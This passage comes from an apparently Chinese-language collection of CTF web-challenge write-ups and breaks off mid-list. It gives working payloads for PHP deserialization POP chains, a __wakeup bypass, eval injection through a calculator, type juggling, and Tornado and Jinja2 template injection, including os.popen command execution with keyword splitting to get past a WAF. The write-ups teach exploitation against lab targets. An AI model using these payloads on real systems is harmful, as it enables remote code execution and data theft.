string(58) "<?php $flag='flag{357825f7-7333-4d88-96d9-30ee8e7e4bd6}';
```

提交`flag`即可。

------

### UnserializeOne

题目描述如下：

> PHP反序列化漏洞系列第一题

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

最终调用点在`Sec::__invoke()`，进入`Sec::__invoke()`需要调用到`Start::__isset()`，而`eeee::__clone()`为进入点，由`Easy::__call()`方法进入`eeee::__clone()`，由`Sec::__tostring()`进入`Easy::__call()`方法，最后从`Start::__destruct()`进入`tostring`方法。需要提交的参数是`pop`，提交的值是经过序列化之后的值。PHP序列化代码如下：

```php
# Sec::__invoke() <- Start::__isset() <- eeee::__clone() <- Easy::__call() <- Sec::__toString() <- Start::__destruct()
<?php 
class Start{
    public $name;
    public $func;
}

class Sec{
    public $obj;
    public $var;
}

class Easy{
    public $cla;
}

class eeee{
    public $obj;
}
$start = new Start();
$sec = new Sec();
$easy = new Easy();
$eeee = new eeee();
$eeee->obj = $start;
$sec->obj = $easy;
$sec->var = $eeee;
$start->name = $sec;
$start->func = $sec;
echo serialize($start);
?>
# O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";r:1;}}s:4:"func";r:2;}
# POST请求提交pop
# flag{3231eb51-9ce0-4faf-ae26-1114d376cd55} Welcome to NewStarCTF, CTFers
```

------

### [极客大挑战 2019]PHP

`dirsearch`扫描靶机目录发现有个名为`www.zip`的备份文件，解压缩后有五个文件，其中`.php`文件源码如下：

```php
# index.php
...
    <?php
    include 'class.php';
    $select = $_GET['select'];		# 获取参数值
    $res=unserialize(@$select);		# 对参数反序列化，说明输入的参数是经过序列化之后的
    ?>
...

# class.php
<?php
include 'flag.php';
error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){		# 用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。
        $this->username = $username;
        $this->password = $password;
    }
    
    function __wakeup(){
        $this->username = 'guest';
    }
    
    function __destruct(){		# 当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。
        if ($this->password != 100) {		# 如果 password != 100 就输出用户名和密码
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {		# 当 username === admin 才能输出 flag
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>

# flag.php
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>
```

经分析，已经确定需要提交的参数是`select`，而且提交的值是经过序列化之后的值，`username=‘admin’,password=‘100’` 才能通过。PHP序列化代码如下：

```php
<?php
class Name{
    private $username = 'admin';
    private $password = '100';
}

$ser = serialize(new Name());
var_dump($ser);        #  O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:"Namepassword";s:3:'100';}
?>
```

直接提交不对。

```
NO!!!hacker!!!
You name is: nonono
You password is: yesyes
```

在类外部使用 `serialize()` 函数进行序列化的时候，会先调用类内部的 `__sleep()` 方法，同理在调用 `unserialize()` 函数的时候会先调用 `__wakeup()` 方法。在上面的 `class `中有一个 `__wakeup()` 方法，调用反序列化函数的时候会先调用了 `__wakeup()` 方法,但是这个方法有个缺陷，就是当参数的个数大于实际参数个数的时候就可以跳过执行 `__wakeup()` 方法。所以修改一下参数个数再提交。

```
?select=O:4:"Name":12:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

得到`flag{c761db1d-fbe0-48f5-bb04-4b14a779d847}`。

------

### [RoarCTF 2019]Easy Calc

靶机提供了一个简单的计算器，经过测试，数字和算式都能被计算，但是字母和一些特殊字符不能被解析。查看网页源码，发现关键代码`calc.php?num="+encodeURIComponent($("#content").val())`。

```python
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>简单的计算器</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./libs/bootstrap.min.css">
  <script src="./libs/jquery-3.3.1.min.js"></script>
  <script src="./libs/bootstrap.min.js"></script>
</head>
<body>
<div class="container text-center" style="margin-top:30px;">
  <h2>表达式</h2>
  <form id="calc">
    <div class="form-group">
      <input type="text" class="form-control" id="content" placeholder="输入计算式" data-com.agilebits.onepassword.user-edited="yes">
    </div>
    <div id="result"><div class="alert alert-success">
            </div></div>
    <button type="submit" class="btn btn-primary">计算</button>
  </form>
</div>
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
</body>
</html>
```

`calc.php?num="+encodeURIComponent($("#content").val())`中的`encodeURIComponent()`函数：

- 不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
- 其他字符（比如 ：;/?&=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。

查看`calc.php`，源码如下：

```php+HTML
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

PHP解析字符串的特性如下：

> PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组`_POST`。
> 例如`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。
> 例如`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。
> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
> `/news.php?%20news[id%00=42"+AND+1=0 #`
> 上述PHP语句的参数`%20news[id%00`的值将存储到`$_GET[“news_id”]`中。
> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
> 1.删除空白符
> 2.将某些字符转换为下划线（包括空格）

使用`scandir()`函数返回指定目录中的文件和目录的数组。扫描靶机根目录是`scandir("/")`，但是`/`被过滤了。访问`/calc.php?%20num=scandir("/")`看到`what are you want to do?`。用`scandir(chr(47))`绕过，访问`/calc.php?%20num=scandir(chr(47))`得到`Array`。使用 `var_dump()` 枚举查看数组中的内容，访问`/calc.php?%20num=var_dump(scandir(chr(47)))`看到以下信息，发现`f1agg`！

```php
array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
```

使用`file_get_contents()`函数将整个文件的内容读入到一个字符串中，`/f1agg`的`ASCII`值为`47, 102, 49, 97, 103, 103`，使用`chr()`得到相应的`ASCII`字符，并用`.`将字符拼接成字符串，`payload`就构造出来啦。

```
/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

得到`flag{203e9d93-fcd6-4095-97bd-7c208b4571da}`。

------

### [极客大挑战 2019]BuyFlag

靶机源代码如下：

```php+HTML
<!DOCTYPE HTML>
<html>

<head>
    <title>Buy You Flag</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
    <link rel="stylesheet" href="assets/css/main.css" />
    <!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
    <!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
</head>

<body>
    <!-- Page Wrapper -->
    <div id="page-wrapper">
        <!-- Header -->
        <header id="header">
            <h1><a href="index.php">Syclover</a></h1>
            <nav id="nav">
                <ul>
                    <li class="special">
                        <a href="#menu" class="menuToggle"><span>Menu</span></a>
                        <div id="menu">
                            <ul>
                                <li><a href="index.php">Home</a></li>
                                <li><a href="pay.php">PayFlag</a></li>
                            </ul>
                        </div>
                    </li>
                </ul>
            </nav>
        </header>
        <!-- Main -->
        <article id="main">
            <header>
                <h2>Flag</h2>
                <p>Flag need your 100000000 money</p>
            </header>
            <section class="wrapper style5">
                <div class="inner">
                    <h3>attention</h3>
                    <p>If you want to buy the FLAG:</br>
                        You must be a student from CUIT!!!</br>
                        You must be answer the correct password!!!
                    </p>
                    <hr />
                    <p>
                        Only Cuit's students can buy the FLAG</br>
                    </p>
                    <hr />
                </div>
            </section>
        </article>
        <!-- Footer -->
        <footer id="footer">
            <ul class="copyright">
                <li>&copy; Syclover</li>
                <li>Design: Cl4y</li>
            </ul>
        </footer>
    </div>
    <!-- Scripts -->
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/jquery.scrollex.min.js"></script>
    <script src="assets/js/jquery.scrolly.min.js"></script>
    <script src="assets/js/skel.min.js"></script>
    <script src="assets/js/util.js"></script>
    <!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
    <script src="assets/js/main.js"></script>
</body>
<!--
    ~~~post money and password~~~
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
-->

</html>
```

`is_numeric()`判断是否为数字，纯数字返回`true`，否则返回`false`。 这道题注释的代码要求输入一个非纯数字的字符串且等于404的密码。`F12`将网页`Cookie`中`user`的`0`值修改为`1`。`HackBar`传入`password=404a&money[]=abc`，这样就能有足够的钱，从而得到`flag{746a2b4e-79f2-4732-9eee-13b483128a16}`。

------

### [护网杯 2018]easy_tornado

靶机信息如下：

```html
/flag.txt
flag in /fllllllllllllag

/welcome.txt
render

/hints.txt
md5(cookie_secret+md5(filename))
```

网址里有参数`filename`和`filehash`推测出`filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(filename))`。 已知`filename`，`cookie_secret`在哪呢？`hints`提示`render`，又根据题目**easy_tornado**可推测出**服务器模板注入。**

> **SSTI注入**就是服务器端模板注入(Server-Side Template Injection)。
>
> 服务端模板：相当于很多公式，根据变量输出结果。这里的模板就是模板引擎根据数据自动生成前端页面。
>
> SSTI也是SSTI利用的是网站模板引擎，主要针对python、php、java的一些网站处理框架（比如Python的Jinja2, Mako, Tornado, Django，PHP的Smarty, Twig，Java的Jade, Velocity），SSTI获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。错误的执行了用户输入。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。

`render()`是`tornado`中的一个渲染函数，可以生成`html`模板，即一个能输出前端页面的公式。

`Tornado`框架的附属文件`handler.settings`中存在`cookie_secret`，`Handler`指向的是处理当前这个页面的`RequestHandler`对象。

`/error?msg={{handler.settings}}`得到`cookie_secret`的值。

知道`filename`和`cookie_secret`后`md5`加密，发送`GET`请求就完事啦。编写`Python`代码求解得到`flag{20061188-f642-48fb-9449-a7abe827c713}`。

```python
import ast
import requests
from hashlib import md5
from bs4 import BeautifulSoup

url = 'http://62002d18-8984-40cd-afd1-1de9523c39d9.node4.buuoj.cn:81/'
response = requests.get(url=url+'error?msg={{handler.settings}}')
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    cookie_secret = ast.literal_eval(soup.body.contents[0])['cookie_secret']
    print('cookie_secret:'+cookie_secret)
else:
    print('Get cookie_secret error!')

filename = '/fllllllllllllag'
tmp = md5(filename.encode()).hexdigest() 
filehash = md5((cookie_secret+tmp).encode()).hexdigest()
print('filehash:'+filehash)
response = requests.get(url+'file?filename={}&filehash={}'.format(filename, filehash))
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    flag = soup.contents[2]
    print('flag:'+flag)
else:
    print('Get flag error!')
```

------

### BabySSTI_One

题目描述如下：

> Flask SSTI模板注入漏洞系列第一题，So Baby Bypass.

靶机要求我们传递一个`NAME`参数，源代码如下：

```html
<body bgcolor=#E1FFFF><br>
    <p><b><center>Welcome to NewStarCTF, Dear CTFer</center></b></p><br>
    <hr><br>
    <center>Try to GET me a NAME</center>
    <!--This is Hint: Flask SSTI is so easy to bypass waf!-->
</body>
```

由`http://25d81339-0a95-47ed-93c9-b88bbd236d38.node4.buuoj.cn:81/?name={{7*%277%27}}`可知这是一个`Jinja2`框架。

```
{7*7} ->49 -> smarty
{{7*'7'}} -> 49 -> twig
{{7*'7'}} -> 7777777 -> jinjia2
```

打开`HackBar`使用`SSTI`模块，试出来`Payload`为：

```
{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
```

访问`/?name={{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}} `看到**Get Out!Hacker!**

被`WAF`挡住了，多次参数`fuzz`后发现是过滤了`init`，`cat`和`flag`。

`tail /fl**`得到`flag{d4c70ebf-c72c-446a-9815-f373a67faeea}`。

```
/?name={{self.__getattribute__('__i'+'nit__').__globals__.__builtins__['__import__']('os').popen('tail /fl**').read()}}

Welcome to NewStarCTF, Dear flag{d4c70ebf-c72c-446a-9815-f373a67faeea}
Try to GET me a NAME
```

另一个师傅的write up，过滤了一些关键字：`class`, `base`, `init`, `...`，字符串拼接绕过即可。列出所有子类：

```
?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}
```

找一下可利用的子类以及下标：

```python
all_class = "<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'functools.partialmethod'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class '_sre.SRE_Pattern'>, <class '_sre.SRE_Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.Pattern'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class '_random.Random'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'Struct'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'textwrap.TextWrapper'>, <class '__future__._Feature'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'contextlib.ContextDecorator'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'zipfile.ZipInfo'>, <class 'zipfile._ZipDecrypter'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.Data'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class 'pkg_resources.extern.packaging._structures.Infinity'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class 'gunicorn.pidfile.Pidfile'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'gunicorn.sock.BaseSocket'>, <class 'gunicorn.arbiter.Arbiter'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'shlex.shlex'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'gunicorn.reloader.InotifyReloader'>, <class 'gunicorn.config.Config'>, <class 'gunicorn.config.Setting'>, <class 'gunicorn.debug.Spew'>, <class 'gunicorn.app.base.BaseApplication'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'queue.Queue'>, <class 'logging.handlers.QueueListener'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'logging.config.ConvertingMixin'>, <class 'logging.config.BaseConfigurator'>, <class 'gunicorn.glogging.Logger'>, <class 'gunicorn.http.unreader.Unreader'>, <class 'gunicorn.http.body.ChunkedReader'>, <class 'gunicorn.http.body.LengthReader'>, <class 'gunicorn.http.body.EOFReader'>, <class 'gunicorn.http.body.Body'>, <class 'gunicorn.http.message.Message'>, <class 'gunicorn.http.parser.Parser'>, <class 'gunicorn.http.wsgi.FileWrapper'>, <class 'gunicorn.http.wsgi.Response'>, <class 'gunicorn.workers.workertmp.WorkerTmp'>, <class 'gunicorn.workers.base.Worker'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'multiprocessing.process.BaseProcess'>, <class 'array.array'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class '_multiprocessing.SemLock'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'multiprocessing.connection.Listener'>, <class 'multiprocessing.connection.SocketListener'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'concurrent.futures.process._ExceptionWithTraceback'>, <class 'concurrent.futures.process._WorkItem'>, <class 'concurrent.futures.process._ResultItem'>, <class 'concurrent.futures.process._CallItem'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'asyncio.futures._TracebackLogger'>, <class 'asyncio.futures.Future'>, <class '_asyncio.Future'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class 'TaskWakeupMethWrapper'>, <class 'asyncio.locks._ContextManager'>, <class 